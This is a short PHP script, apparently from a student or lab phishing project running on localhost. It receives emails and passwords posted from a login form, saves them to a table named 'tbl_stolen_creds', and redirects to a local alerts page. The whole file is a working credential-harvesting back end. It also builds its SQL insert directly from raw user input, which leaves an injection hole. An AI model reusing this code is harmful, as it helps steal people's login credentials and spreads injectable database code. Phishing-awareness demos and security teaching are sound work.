<?php
include "../include/config.php";

    $connection = OpenConnection();
    $email = $_POST['email'];
    $pass = $_POST['password'];

    // construct query string - insert into db
    $sql2= "insert into tbl_stolen_creds (Email, Password) values
		('$email', '$pass')";

    // connection confirmation
    if (mysqli_query($connection, $sql2)){
        echo "Successful $email";
        header("Location: http://localhost/Bowser-Project2/local_alerts/alerts_page.php");
    } else {
        echo mysqli_error($connection);
    }

    CloseConnection($connection);

?>